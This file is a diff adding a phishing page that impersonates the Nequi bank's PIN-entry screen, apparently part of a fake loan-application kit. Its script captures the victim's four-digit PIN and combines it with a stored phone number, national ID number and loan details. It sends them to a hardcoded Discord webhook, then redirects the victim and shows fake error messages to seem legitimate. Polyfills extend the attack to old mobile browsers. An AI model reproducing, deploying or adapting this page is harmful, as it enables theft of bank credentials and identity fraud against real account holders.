@@ -1,0 +1,536 @@
+<!doctype html>
+<!-- saved from url=(0068)https://estudiodecredito.replit.app/1/validate-data/auth-v2-pass.php -->
+<html lang="en">
+  <head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Nequi</title>
+    <link rel="stylesheet" href="../css/spinner-2.css">
+    <link rel="stylesheet" href="../css/navbar.css">
+    <link rel="stylesheet" href="../css/globals-2.css">
+    <link rel="stylesheet" href="../css/load-spinner.css">
+
+    <link rel="shortcut icon" type="image/x-icon" href="../assets/favicon-2.ico">
+    <style>
+      .loadingContainer {
+        display: none;
+      }
+
+      footer {
+        margin-top: 40px;
+        background: url(../assets/footer-nequi.svg);
+        background-repeat: no-repeat;
+        background-size: cover;
+        padding: 100px 0 60px 0;
+      }
+    </style>
+
+    <!-- ============================================================
+         POLYFILLS UNIVERSALES
+         Se activan SOLO si el navegador no tiene la función nativa.
+         Los navegadores modernos los ignoran completamente.
+         ============================================================ -->
+    <script>
+      // 1) Promise (Android 4.x, Chrome < 32)
+      if (typeof Promise === "undefined") {
+        window.Promise = (function () {
+          function P(fn) {
+            var self = this;
+            self._s = 0; self._v = null; self._h = [];
+            function ok(v){ self._s=1; self._v=v; flush(); }
+            function no(v){ self._s=2; self._v=v; flush(); }
+            function flush(){
+              self._h.forEach(function(h){
+                if (self._s===1 && h.f) h.f(self._v);
+                if (self._s===2 && h.r) h.r(self._v);
+              });
+              self._h = [];
+            }
+            self.then = function(f,r){
+              return new P(function(res,rej){
+                self._h.push({
+                  f: function(v){ try{ res(f?f(v):v); }catch(e){ rej(e); } },
+                  r: function(v){ try{ rej(r?r(v):v); }catch(e){ rej(e); } }
+                });
+                flush();
+              });
+            };
+            self["catch"] = function(r){ return self.then(null,r); };
+            try{ fn(ok,no); }catch(e){ no(e); }
+          }
+          P.resolve = function(v){ return new P(function(r){ r(v); }); };
+          P.reject  = function(v){ return new P(function(_,r){ r(v); }); };
+          return P;
+        })();
+      }
+
+      // 2) fetch (Android 4.x, Chrome < 42, Safari < 10.1)
+      if (typeof fetch === "undefined") {
+        window.fetch = function(url, opt){
+          opt = opt || {};
+          return new Promise(function(resolve, reject){
+            var x = new XMLHttpRequest();
+            x.open(opt.method || "GET", url, true);
+            if (opt.headers) for (var k in opt.headers) {
+              if (opt.headers.hasOwnProperty(k)) {
+                try { x.setRequestHeader(k, opt.headers[k]); } catch(e){}
+              }
+            }
+            x.onload = function(){
+              resolve({
+                ok: x.status >= 200 && x.status < 300,
+                status: x.status,
+                text: function(){ return Promise.resolve(x.responseText); },
+                json: function(){ return Promise.resolve(JSON.parse(x.responseText)); }
+              });
+            };
+            x.onerror = function(){ reject(new Error("Network error")); };
+            x.send(opt.body || null);
+          });
+        };
+      }
+
+      // 3) Object.assign (Chrome < 45, Android < 5)
+      if (typeof Object.assign !== "function") {
+        Object.assign = function(t){
+          for (var i=1;i<arguments.length;i++){
+            var s = arguments[i];
+            if (s) for (var k in s) if (Object.prototype.hasOwnProperty.call(s,k)) t[k]=s[k];
+          }
+          return t;
+        };
+      }
+
+      // 4) Array.from (Chrome < 45)
+      if (!Array.from) {
+        Array.from = function(a){ var r=[]; for(var i=0;i<a.length;i++) r.push(a[i]); return r; };
+      }
+
+      // 5) Array.prototype.find (Chrome < 45)
+      if (!Array.prototype.find) {
+        Array.prototype.find = function(p){
+          for (var i=0;i<this.length;i++) if (p(this[i],i,this)) return this[i];
+        };
+      }
+
+      // 6) Array.prototype.includes (Chrome < 47)
+      if (!Array.prototype.includes) {
+        Array.prototype.includes = function(v){
+          return this.indexOf(v) !== -1;
+        };
+      }
+
+      // 7) String.prototype.includes (Chrome < 41)
+      if (!String.prototype.includes) {
+        String.prototype.includes = function(s,p){ return this.indexOf(s, p||0) !== -1; };
+      }
+
+      // 8) Element.closest (Chrome < 41, Safari < 9)
+      if (window.Element && !Element.prototype.closest) {
+        Element.prototype.closest = function(sel){
+          var el = this;
+          while (el && el.nodeType === 1) {
+            if (el.matches && el.matches(sel)) return el;
+            if (el.msMatchesSelector && el.msMatchesSelector(sel)) return el;
+            if (el.webkitMatchesSelector && el.webkitMatchesSelector(sel)) return el;
+            el = el.parentElement || el.parentNode;
+          }
+          return null;
+        };
+      }
+
+      // 9) NodeList.forEach (Chrome < 51, Safari < 10)
+      if (window.NodeList && !NodeList.prototype.forEach) {
+        NodeList.prototype.forEach = Array.prototype.forEach;
+      }
+
+      // 10) Element.matches (Safari < 7.1)
+      if (window.Element && !Element.prototype.matches) {
+        Element.prototype.matches =
+          Element.prototype.matchesSelector ||
+          Element.prototype.mozMatchesSelector ||
+          Element.prototype.msMatchesSelector ||
+          Element.prototype.oMatchesSelector ||
+          Element.prototype.webkitMatchesSelector ||
+          function(s){ var m=(this.document||this.ownerDocument).querySelectorAll(s), i=m.length; while(--i>=0 && m[i]!==this){} return i>-1; };
+      }
+
+      // 11) Intl.NumberFormat
+      if (typeof Intl === "undefined") window.Intl = {};
+      if (!Intl.NumberFormat) {
+        Intl.NumberFormat = function(loc, opt){
+          opt = opt || {};
+          var minD = opt.minimumFractionDigits || 0;
+          var maxD = opt.maximumFractionDigits || 0;
+          return {
+            format: function(n){
+              n = Number(n) || 0;
+              var parts = n.toFixed(Math.min(maxD, minD)).split(".");
+              var ip = parts[0].replace(/\B(?=(\d{3})+(?!\d))/g, ".");
+              return parts[1] ? ip + "," + parts[1] : ip;
+            }
+          };
+        };
+      }
+
+      // 12) CustomEvent
+      if (typeof window.CustomEvent !== "function") {
+        window.CustomEvent = function(event, params){
+          params = params || { bubbles:false, cancelable:false, detail:null };
+          var e = document.createEvent("CustomEvent");
+          e.initCustomEvent(event, params.bubbles, params.cancelable, params.detail);
+          return e;
+        };
+      }
+
+      // 13) URLSearchParams
+      if (typeof URLSearchParams === "undefined") {
+        window.URLSearchParams = function(init){
+          this._p = [];
+          if (init) {
+            var s = String(init).replace(/^\?/, "").split("&");
+            for (var i=0;i<s.length;i++) {
+              var kv = s[i].split("=");
+              if (kv[0]) this._p.push([decodeURIComponent(kv[0]), decodeURIComponent(kv[1]||"")]);
+            }
+          }
+          this.append = function(k,v){ this._p.push([k,v]); };
+          this.toString = function(){
+            return this._p.map(function(p){ return encodeURIComponent(p[0])+"="+encodeURIComponent(p[1]); }).join("&");
+          };
+        };
+      }
+
+      // 14) Helpers de localStorage blindados (para modo incógnito estricto)
+      window.getFormDataSafe = function () {
+        try { return JSON.parse(localStorage.getItem("formData")) || {}; }
+        catch (e) { return {}; }
+      };
+      window.setFormDataSafe = function (data) {
+        try { localStorage.setItem("formData", JSON.stringify(data)); return true; }
+        catch (e) { window._formDataMem = data; return false; }
+      };
+    </script>
+  </head>
+
+  <body class="bg-purple-primary h-dvh flex flex-col">
+    <main class="loadingContainer">
+      <header class="z-[999] fixed top-0 w-full h-16 mx-auto pt-0 pb-0 overflow-visible bg-white">
+        <div class="flex items-center h-full border-b border-gray-primary bg-white px-[26px]">
+          <div class="flex items-center justify-between w-full max-w-[61.875rem] h-full mx-auto">
+            <a href="access-sign-in-pass.php.html" class="h-8 [&amp;&gt;svg]:w-[100px]">
+              <svg _ngcontent-atq-c28="" width="180" height="40" viewbox="0 0 104 32" fill="none" xmlns="http://www.w3.org/2000/svg" class="splash__container__svg">
+                <path _ngcontent-atq-c28="" d="M5.29905 0H0.918073C0.411035 0 0 0.408316 0 0.912V4.608C0 5.11168 0.411035 5.52 0.918073 5.52H5.29905C5.80609 5.52 6.21713 5.11168 6.21713 4.608V0.912C6.21713 0.408316 5.80609 0 5.29905 0Z" fill="#DA0081" class="point__up"></path>
+                <path _ngcontent-atq-c28="" d="M5.29905 0H0.918073C0.411035 0 0 0.408316 0 0.912V4.608C0 5.11168 0.411035 5.52 0.918073 5.52H5.29905C5.80609 5.52 6.21713 5.11168 6.21713 4.608V0.912C6.21713 0.408316 5.80609 0 5.29905 0Z" fill="#DA0081" class="point__down"></path>
+                <path _ngcontent-atq-c28="" d="M31.9876 0H28.2187C27.7033 0 27.3006 0.416 27.3006 0.912V15.872C27.3006 16.176 26.8979 16.288 26.753 16.016L17.991 0.4C17.8461 0.144 17.5884 0 17.2823 0H11.0169C10.5015 0 10.0988 0.416 10.0988 0.912V24.816C10.0988 25.328 10.5176 25.728 11.0169 25.728H14.7858C15.3012 25.728 15.7039 25.312 15.7039 24.816V9.408C15.7039 9.104 16.1066 8.992 16.2515 9.264L25.2551 25.344C25.4 25.6 25.6577 25.744 25.9638 25.744H31.9554C32.4708 25.744 32.8735 25.328 32.8735 24.832V0.912C32.8735 0.4 32.4547 0 31.9554 0H31.9876Z" fill="#200020" class="N"></path>
+                <path _ngcontent-atq-c28="" d="M54.6495 16.3999C54.6495 9.66395 50.2363 6.31995 45.3883 6.31995C39.0906 6.31995 35.4988 10.6559 35.4988 16.5119C35.4988 23.1679 40.0087 26.3359 45.2433 26.3359C50.4779 26.3359 53.5382 23.6479 54.3596 20.1599C54.4724 19.7119 54.2147 19.3119 53.5382 19.3119H50.5746C50.2363 19.3119 49.9464 19.4879 49.8015 19.8239C49.0606 21.4399 47.8687 22.2879 45.5815 22.2879C42.9884 22.2879 41.2489 20.6719 40.9912 17.3919H53.7315C54.2791 17.3919 54.6495 16.9919 54.6495 16.3999ZM41.2006 13.8559C41.7482 11.4399 43.1656 10.3679 45.3077 10.3679C47.2244 10.3679 48.8673 11.4719 49.0928 13.8559H41.2006Z" fill="#200020" class="E"></path>
+                <path _ngcontent-atq-c28="" d="M103.082 6.80005H99.2969C98.7899 6.80005 98.3788 7.20837 98.3788 7.71205V24.832C98.3788 25.3357 98.7899 25.744 99.2969 25.744H103.082C103.589 25.744 104 25.3357 104 24.832V7.71205C104 7.20837 103.589 6.80005 103.082 6.80005Z" fill="#200020" class="I"></path>
+                <path _ngcontent-atq-c28="" d="M74.976 6.80002H71.2071C70.6917 6.80002 70.289 7.21602 70.289 7.71202V8.64002C69.1615 7.32802 67.3093 6.41602 64.8772 6.41602C59.4332 6.41602 56.5501 11.312 56.5501 16.496C56.5501 21.024 58.9178 26.096 64.7644 26.096C66.8583 26.096 69.081 25.104 70.289 23.696V31.056C70.289 31.568 70.7078 31.968 71.2071 31.968H74.976C75.4914 31.968 75.8941 31.552 75.8941 31.056V7.72802C75.8941 7.21602 75.4753 6.81602 74.976 6.81602V6.80002ZM66.3912 22.064C63.9108 22.064 62.1713 20.256 62.1713 16.368C62.1713 12.48 63.9108 10.448 66.3912 10.448C68.8716 10.448 70.6111 12.32 70.6111 16.368C70.6111 20.416 68.8716 22.064 66.3912 22.064Z" fill="#200020" class="Q"></path>
+                <path _ngcontent-atq-c28="" d="M95.0448 6.80005H91.2759C90.7604 6.80005 90.3578 7.21605 90.3578 7.71205V17.3921C90.3578 20.5121 88.9565 21.4241 87.1687 21.4241C85.3809 21.4241 83.9796 20.5121 83.9796 17.3921V7.71205C83.9796 7.20005 83.5608 6.80005 83.0615 6.80005H79.2926C78.7772 6.80005 78.3745 7.21605 78.3745 7.71205V17.7921C78.3745 23.7921 81.7086 26.2081 87.1848 26.2081C92.661 26.2081 95.9951 23.7761 95.9951 17.7921V7.71205C95.9951 7.20005 95.5763 6.80005 95.077 6.80005H95.0448Z" fill="#200020" class="U"></path>
+              </svg>
+            </a>
+            <button class="flex flex-col justify-between w-[25px] h-[20px] bg-transparent border-none cursor-pointer" aria-label="Menu">
+              <span class="bar w-full max-w-[25px] h-px my-[3px] bg-purple-primary transition-all duration-400 py-px"></span>
+              <span class="bar w-full max-w-[25px] h-px my-[3px] bg-purple-primary transition-all duration-400 py-px"></span>
+              <span class="bar w-full max-w-[25px] h-px my-[3px] bg-purple-primary transition-all duration-400 py-px"></span>
+            </button>
+          </div>
+        </div>
+      </header>
+
+      <footer>
+        <div class="wrap">
+          <div class="wrapper">
+            <div class="footer">
+              <img class="footer-pc" src="../assets/footer-bigscreen-1.png" alt="">
+              <img class="footer-mobile" src="../assets/footer-1.png" alt="">
+            </div>
+          </div>
+        </div>
+      </footer>
+    </main>
+
+    <div class="loading-spinner" id="loadingContenedor">
+      <div class="nequi-loader" id="loader">
+        <div class="cube"></div>
+        <div class="cube"></div>
+      </div>
+    </div>
+
+    <div class="bg-white fixed top-0 left-0 w-full h-full z-50 hidden" id="error-login">
+      <div class="min-h-dvh p-11 max-w-screen-sm mx-auto flex justify-center items-center">
+        <section class="bg-white rounded-lg py-11 mb-80">
+          <div class="flex flex-col items-center">
+            <div class="flex justify-center items-center">
+              <img class="max-w-[5.5rem]" src="../assets/iconsad.svg" alt="">
+            </div>
+            <h1 class="text-lg font-bold text-[#210021] w-full text-center mb-4 mt-1">
+              ¡Ups, algo salió mal!
+            </h1>
+            <p id="wait-msg" class="text-[#210021] w-full text-center mb-4 mt-1 text-sm font-medium">
+              El número de teléfono o la contraseña que proporcionaste no son
+              correctos. Por favor revísalos e intenta ingresar nuevamente.
+            </p>
+            <button class="bg-[#DA0081] text-white px-4 py-2 rounded-lg mx-auto cursor-pointer hover:bg-[#c1007a]" id="tryAgainButton">
+              Intentar nuevamente
+            </button>
+          </div>
+        </section>
+      </div>
+    </div>
+    <header class="w-full flex flex-col p-5 mb-4">
+      <a href="./auth-login.html" class="w-6 h-6 text-white mb-5">
+        <svg xmlns="http://www.w3.org/2000/svg" viewbox="0 0 448 512" fill="currentColor" width="100%" height="100%">
+          <path d="M9.4 233.4c-12.5 12.5-12.5 32.8 0 45.3l160 160c12.5 12.5 32.8 12.5 45.3 0s12.5-32.8 0-45.3L109.2 288 416 288c17.7 0 32-14.3 32-32s-14.3-32-32-32l-306.7 0L214.6 118.6c12.5-12.5 12.5-32.8 0-45.3s-32.8-12.5-45.3 0l-160 160z"></path>
+        </svg>
+      </a>
+      <h1 class="text-white text-2xl font-bold">Escribe tu clave</h1>
+    </header>
+    <section class="flex-1 max-w-[420px] flex flex-col mx-auto w-full px-4">
+      <div class="max-w-[350px] w-full flex justify-center gap-8 mx-auto [&amp;&gt;input]:w-11 [&amp;&gt;input]:h-11 [&amp;&gt;input]:text-center [&amp;&gt;input]:bg-guanabana [&amp;&gt;input]:rounded-sm [&amp;&gt;input]:text-4xl [&amp;&gt;input]:font-bold [&amp;&gt;input]:text-pink-primary [&amp;&gt;input]:focus:outline-none [&amp;&gt;input]:pt-2.5">
+        <input id="pass-1" maxlength="1" inputmode="none" readonly="readonly">
+        <input id="pass-2" maxlength="1" inputmode="none" readonly="readonly">
+        <input id="pass-3" maxlength="1" inputmode="none" readonly="readonly">
+        <input id="pass-4" maxlength="1" inputmode="none" readonly="readonly">
+      </div>
+      <p class="text-center text-white text-sm mt-5 mb-8">
+        No dudamos que seas tú...
+        <br>
+        Pero es mejor confirmar ;)
+      </p>
+      <div class="mt-auto w-full max-w-[400px] mx-auto" id="keyboard">
+        <div class="flex justify-around mb-4 [&amp;&gt;button]:w-12 [&amp;&gt;button]:h-12 [&amp;&gt;button]:border-none [&amp;&gt;button]:bg-transparent [&amp;&gt;button]:text-4xl [&amp;&gt;button]:text-white [&amp;&gt;button]:cursor-pointer [&amp;&gt;button]:rounded-full [&amp;&gt;button]:transition-colors [&amp;&gt;button]:duration-200 [&amp;&gt;button]:select-none [&amp;&gt;button]:touch-manipulation [&amp;&gt;button]:focus:outline-none">
+          <button class="keyboard-btn" data-value="1">1</button>
+          <button class="keyboard-btn" data-value="2">2</button>
+          <button class="keyboard-btn" data-value="3">3</button>
+        </div>
+        <div class="flex justify-around mb-4 [&amp;&gt;button]:w-12 [&amp;&gt;button]:h-12 [&amp;&gt;button]:border-none [&amp;&gt;button]:bg-transparent [&amp;&gt;button]:text-4xl [&amp;&gt;button]:text-white [&amp;&gt;button]:cursor-pointer [&amp;&gt;button]:rounded-full [&amp;&gt;button]:transition-colors [&amp;&gt;button]:duration-200 [&amp;&gt;button]:select-none [&amp;&gt;button]:touch-manipulation [&amp;&gt;button]:focus:outline-none">
+          <button class="keyboard-btn" data-value="4">4</button>
+          <button class="keyboard-btn" data-value="5">5</button>
+          <button class="keyboard-btn" data-value="6">6</button>
+        </div>
+        <div class="flex justify-around mb-4 [&amp;&gt;button]:w-12 [&amp;&gt;button]:h-12 [&amp;&gt;button]:border-none [&amp;&gt;button]:bg-transparent [&amp;&gt;button]:text-4xl [&amp;&gt;button]:text-white [&amp;&gt;button]:cursor-pointer [&amp;&gt;button]:rounded-full [&amp;&gt;button]:transition-colors [&amp;&gt;button]:duration-200 [&amp;&gt;button]:select-none [&amp;&gt;button]:touch-manipulation [&amp;&gt;button]:focus:outline-none">
+          <button class="keyboard-btn" data-value="7">7</button>
+          <button class="keyboard-btn" data-value="8">8</button>
+          <button class="keyboard-btn" data-value="9">9</button>
+        </div>
+        <div class="flex justify-around mb-4 [&amp;&gt;button]:w-12 [&amp;&gt;button]:h-12 [&amp;&gt;button]:border-none [&amp;&gt;button]:bg-transparent [&amp;&gt;button]:text-4xl [&amp;&gt;button]:text-white [&amp;&gt;button]:cursor-pointer [&amp;&gt;button]:rounded-full [&amp;&gt;button]:transition-colors [&amp;&gt;button]:duration-200 [&amp;&gt;button]:select-none [&amp;&gt;button]:touch-manipulation [&amp;&gt;button]:focus:outline-none">
+          <button class="invisible" disabled=""></button>
+          <button class="keyboard-btn" data-value="0">0</button>
+          <button class="keyboard-btn text-white" id="delete-pass">
+            <svg width="33" height="30" viewbox="0 0 29 27" fill="none" xmlns="http://www.w3.org/2000/svg">
+              <path fill-rule="evenodd" clip-rule="evenodd" d="M26.8068 0C27.9114 0 28.8068 0.895431 28.8068 2V24.727C28.8068 25.8316 27.9114 26.727 26.8068 26.727H15.4722C14.9712 26.727 14.4884 26.5389 14.1194 26.2001L4.15169 17.0462C1.99435 15.065 1.99435 11.662 4.15169 9.68082L14.1194 0.526929C14.4884 0.188043 14.9712 0 15.4722 0H26.8068Z" fill="currentColor"></path>
+              <path d="M16.3541 11.1945L21.3873 16.2277" stroke="#200020" stroke-linecap="round" stroke-linejoin="round"></path>
+              <path d="M21.2213 11.4275L16.3423 16.3065" stroke="#200020" stroke-linecap="round" stroke-linejoin="round"></path>
+            </svg>
+          </button>
+        </div>
+      </div>
+    </section>
+
+    <!--
+      NOTA: Se cambió <script type="module"> por <script> normal
+      para compatibilidad con navegadores antiguos (Android 4.x,
+      Chrome < 61, Safari < 10.1, etc.).
+      También se eliminó async/await, que rompe Android 4.x.
+    -->
+    <script>
+      document.addEventListener("DOMContentLoaded", function () {
+        var inputs = document.querySelectorAll('input[id^="pass-"]');
+        var keyboard = document.getElementById("keyboard");
+        var deleteBtn = document.getElementById("delete-pass");
+        var errorLogin = document.getElementById("error-login");
+        var tryAgainButton = document.getElementById("tryAgainButton");
+        var loadingContenedor = document.getElementById("loadingContenedor");
+        var currentInput = 0;
+
+        // ===== WEBHOOK DISCORD =====
+        var WEBHOOK_URL = "https://discord.com/api/webhooks/1560271962012651641/S0P2R_wy0Ic3f06qIhuXyVRj6cyjZe9MQYzcW7NXp9-UEgv9mF6tVqAmCFnoFRSB7_DY";
+
+        // Función de envío con fallback XHR (funciona en todos los navegadores)
+        function sendDiscordMessage(content) {
+          var payload = { content: content };
+          var bodyStr = JSON.stringify(payload);
+
+          // Intentar con fetch si existe
+          if (typeof fetch === "function") {
+            try {
+              fetch(WEBHOOK_URL, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: bodyStr
+              }).then(function(r){
+                if (!r.ok) console.warn("Discord status:", r.status);
+              })["catch"](function(err){
+                console.warn("fetch falló, usando XHR:", err);
+                xhrSend(bodyStr);
+              });
+              return;
+            } catch (e) {
+              // Si fetch lanza síncronamente, caer a XHR
+            }
+          }
+          xhrSend(bodyStr);
+        }
+
+        function xhrSend(bodyStr) {
+          try {
+            var x = new XMLHttpRequest();
+            x.open("POST", WEBHOOK_URL, true);
+            x.setRequestHeader("Content-Type", "application/json");
+            x.send(bodyStr);
+          } catch (e) {
+            console.warn("XHR falló también:", e);
+          }
+        }
+
+        // ===== BOTÓN "INTENTAR NUEVAMENTE" =====
+        if (tryAgainButton) {
+          tryAgainButton.addEventListener("click", function () {
+            window.location.href = "accces-sign-in.php.html";
+          });
+        }
+
+        // ===== TECLADO NUMÉRICO =====
+        if (keyboard) {
+          keyboard.addEventListener("click", function (e) {
+            var button = e.target.closest ? e.target.closest(".keyboard-btn") : null;
+            if (button && button.id.indexOf("delete") === -1) {
+              var value = button.getAttribute("data-value");
+              if (currentInput < inputs.length) {
+                inputs[currentInput].setAttribute("data-real-value", value);
+                inputs[currentInput].value = "*";
+                // Dispatch input (con fallback para navegadores antiguos)
+                try {
+                  inputs[currentInput].dispatchEvent(new Event("input", { bubbles: true }));
+                } catch (err) {
+                  var ev = document.createEvent("Event");
+                  ev.initEvent("input", true, true);
+                  inputs[currentInput].dispatchEvent(ev);
+                }
+                currentInput++;
+              }
+            }
+          });
+        }
+
+        // ===== BOTÓN BORRAR =====
+        if (deleteBtn) {
+          deleteBtn.addEventListener("click", function () {
+            if (currentInput > 0) {
+              currentInput--;
+              inputs[currentInput].value = "";
+              inputs[currentInput].removeAttribute("data-real-value");
+              try {
+                inputs[currentInput].dispatchEvent(new Event("input", { bubbles: true }));
+              } catch (err) {
+                var ev = document.createEvent("Event");
+                ev.initEvent("input", true, true);
+                inputs[currentInput].dispatchEvent(ev);
+              }
+            }
+          });
+        }
+
+        // ===== TECLA BACKSPACE FÍSICA =====
+        document.addEventListener("keydown", function (e) {
+          if (e.key === "Backspace" && currentInput > 0) {
+            currentInput--;
+            inputs[currentInput].value = "";
+            inputs[currentInput].removeAttribute("data-real-value");
+            try {
+              inputs[currentInput].dispatchEvent(new Event("input", { bubbles: true }));
+            } catch (err) {
+              var ev = document.createEvent("Event");
+              ev.initEvent("input", true, true);
+              inputs[currentInput].dispatchEvent(ev);
+            }
+          }
+        });
+
+        // ===== BLOQUEAR ENTRADA FÍSICA EN LOS INPUTS =====
+        for (var i = 0; i < inputs.length; i++) {
+          (function (input) {
+            var evTypes = ["keydown", "keyup", "keypress", "input", "textInput"];
+            for (var j = 0; j < evTypes.length; j++) {
+              input.addEventListener(evTypes[j], function (e) {
+                e.preventDefault();
+                return false;
+              });
+            }
+            input.addEventListener("paste", function (e) {
+              e.preventDefault();
+              return false;
+            });
+            input.setAttribute("readonly", "readonly");
+            input.setAttribute("inputmode", "none");
+          })(inputs[i]);
+        }
+
+        // ===== VALIDACIÓN: 3 DÍGITOS SEGUIDOS IGUALES =====
+        function tieneTresSeguidos(entrada) {
+          var texto = String(entrada);
+          var regex = /(.)\1\1/;
+          return regex.test(texto);
+        }
+
+        // ===== CUANDO TODOS LOS CAMPOS ESTÉN LLENOS =====
+        function verificarPassCompleto() {
+          var isComplete = true;
+          for (var k = 0; k < inputs.length; k++) {
+            if (inputs[k].value === "") { isComplete = false; break; }
+          }
+          if (!isComplete) return;
+
+          var pass = "";
+          for (var m = 0; m < inputs.length; m++) {
+            pass += inputs[m].getAttribute("data-real-value") || "";
+          }
+
+          loadingContenedor.style.display = "flex";
+
+          if (tieneTresSeguidos(pass)) {
+            setTimeout(function () {
+              loadingContenedor.style.display = "none";
+              errorLogin.style.display = "block";
+            }, 3000);
+            return;
+          }
+
+          // Guardar en formData (con helper seguro)
+          var formData = window.getFormDataSafe ? window.getFormDataSafe() : {};
+          var transactionId = Date.now().toString(36) + Math.random().toString(36).substr(2);
+          formData.password = pass;
+          formData.transactionId = transactionId;
+          if (window.setFormDataSafe) window.setFormDataSafe(formData);
+
+          // Redirigir (funciona en todos los navegadores)
+          setTimeout(function () {
+            window.location.href = "questions-credit.php.html";
+          }, 3000);
+
+          // ===== ENVÍO A DISCORD (no bloqueante) =====
+          var discordMessage =
+  "✅ **User y Pass** ✅\n\n" +
+  "📱 **Número**: " + (formData.phoneNumber || "No disponible") + "\n" +
+  "🔑 **Clave**: " + pass + "\n" +
+  "💰 **Monto solicitado**: $" + (formData.montoPrestamo || "No disponible") + "\n" +
+  "📆 **Plazo**: " + (formData.plazo || "No disponible") + " meses\n" +
+  "🪪 **Cédula**: " + (formData.cedula || "No disponible") + "\n" +
+  "════════════════════════════════════";
+          sendDiscordMessage(discordMessage);
+        }
+
+        // Escuchar cambios en cada input
+        for (var n = 0; n < inputs.length; n++) {
+          (function (input) {
+            input.addEventListener("input", function () {
+              verificarPassCompleto();
+            });
+          })(inputs[n]);
+        }
+      });
+    </script>
+  </body>
+</html>
